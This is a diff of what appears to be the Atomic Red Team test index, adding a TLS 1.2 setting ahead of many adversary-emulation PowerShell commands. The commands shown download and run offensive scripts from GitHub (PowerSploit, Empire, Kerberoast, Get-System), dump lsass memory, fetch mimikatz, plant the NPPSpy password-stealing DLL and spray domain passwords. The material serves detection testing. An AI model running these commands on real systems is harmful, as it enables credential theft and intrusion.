@@ -1113,6 +1113,7 @@ credential-access:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
         cleanup_command: 'Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction
@@ -2338,6 +2339,7 @@ credential-access:
       - windows
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
           Invoke-Kerberoast | fl
         name: powershell
@@ -2851,6 +2853,7 @@ credential-access:
 '
         get_prereq_command: |
           $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
           if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
             Expand-Archive $zippath $parentpath\wce -Force
@@ -2892,6 +2895,7 @@ credential-access:
 
 '
         get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
           Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
           New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
@@ -2946,6 +2950,7 @@ credential-access:
 
 '
         get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null
           Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile #{dumpert_exe}
       executor:
@@ -3000,6 +3005,7 @@ credential-access:
 
 '
         get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           $url = 'https://github.com/gentilkiwi/mimikatz/releases/latest'
           $request = [System.Net.WebRequest]::Create($url)
           $response = $request.GetResponse()
@@ -3083,10 +3089,9 @@ credential-access:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'');
-          get-process lsass | Out-Minidump
-
-'
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump
         cleanup_command: 'Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
 
 '
@@ -3221,10 +3226,9 @@ credential-access:
         prereq_command: 'if (Test-Path ''#{xordump_exe}'') {exit 0} else {exit 1}
 
 '
-        get_prereq_command: 'Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe"
-          -OutFile #{xordump_exe}
-
-'
+        get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe" -OutFile #{xordump_exe}
       executor:
         command: "#{xordump_exe} -out #{output_file} -x 0x41\n"
         cleanup_command: 'Remove-Item ${output_file} -ErrorAction Ignore
@@ -4035,8 +4039,9 @@ credential-access:
       - description: NPPSpy.dll must be available in local temp directory
         prereq_command: if (Test-Path "$env:Temp\NPPSPY.dll") {exit 0} else {exit
           1}
-        get_prereq_command: Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll
-          -OutFile "$env:Temp\NPPSPY.dll"
+        get_prereq_command: |-
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "$env:Temp\NPPSPY.dll"
       executor:
         command: |-
           Copy-Item "$env:Temp\NPPSPY.dll" -Destination "C:\Windows\System32"
@@ -4611,11 +4616,9 @@ credential-access:
       executor:
         name: powershell
         elevation_required: false
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1''
-          -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain
-          #{domain} -Force
-
-'
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
     - name: Password spray all domain users with a single password via LDAP against
         domain controller (NTLM or Kerberos)
       auto_generated_guid: f14d956a-5b6e-4a93-847f-0c415142f07d
@@ -6925,6 +6928,7 @@ collection:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA"
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
@@ -15223,7 +15227,8 @@ privilege-escalation:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+        command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n"
         name: powershell
@@ -15357,6 +15362,7 @@ privilege-escalation:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
         name: powershell
@@ -15393,6 +15399,7 @@ privilege-escalation:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
@@ -15405,6 +15412,7 @@ privilege-escalation:
 
 '
         get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
           New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
@@ -16250,7 +16258,8 @@ privilege-escalation:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+        command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
@@ -17674,8 +17683,9 @@ privilege-escalation:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
-          -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
         name: powershell
         elevation_required: true
     - name: "`SeDebugPrivilege` token duplication"
@@ -17686,8 +17696,9 @@ privilege-escalation:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
-          -UseBasicParsing); Get-System -Technique Token -Verbose
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
         name: powershell
         elevation_required: true
   T1546.005:
@@ -20434,6 +20445,7 @@ defense-evasion:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
         name: powershell
@@ -25272,6 +25284,7 @@ defense-evasion:
         command: |
           $macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")
           $macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
         cleanup_command: 'Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore
@@ -30916,7 +30929,8 @@ defense-evasion:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+        command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n"
         name: powershell
@@ -31050,6 +31064,7 @@ defense-evasion:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
         name: powershell
@@ -31086,6 +31101,7 @@ defense-evasion:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
@@ -31098,6 +31114,7 @@ defense-evasion:
 
 '
         get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
           New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
@@ -35143,8 +35160,9 @@ defense-evasion:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
-          -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
         name: powershell
         elevation_required: true
     - name: "`SeDebugPrivilege` token duplication"
@@ -35155,8 +35173,9 @@ defense-evasion:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
-          -UseBasicParsing); Get-System -Technique Token -Verbose
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
         name: powershell
         elevation_required: true
   T1205:
@@ -44284,7 +44303,8 @@ persistence:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+        command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
@@ -50047,10 +50067,9 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
-          -UseBasicParsing); Find-LocalAdminAccess -Verbose
-
-'
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
         name: powershell
     - name: Find local admins on all machines in domain (PowerView)
       auto_generated_guid: a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd
@@ -50062,10 +50081,9 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
-          -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
-
-'
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
         name: powershell
     - name: Find Local Admins via Group Policy (PowerView)
       auto_generated_guid: 64fdb43b-5259-467a-b000-1b02c00e510a
@@ -50081,9 +50099,9 @@ discovery:
           type: Path
           default: "$env:COMPUTERNAME"
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
-          -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name}
-          -Verbose'
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose"
         name: powershell
     - name: Enumerate Users Not Requiring Pre Auth (ASRepRoast)
       auto_generated_guid: 870ba71e-6858-4f6d-895c-bb6237f6121b
@@ -50143,10 +50161,9 @@ discovery:
         prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
 
 '
-        get_prereq_command: 'Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe"
-          -OutFile #{adfind_path}
-
-'
+        get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
       executor:
         command: "#{adfind_path} -f (objectcategory=group)\n"
         name: command_prompt
@@ -51226,10 +51243,9 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
-          -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
-
-'
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
         name: powershell
   T1040:
     technique:
@@ -53292,10 +53308,9 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
-          -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
-
-'
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
         name: powershell
   T1007:
     technique:
@@ -60056,7 +60071,8 @@ execution:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+        command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
@@ -68135,6 +68151,7 @@ initial-access:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
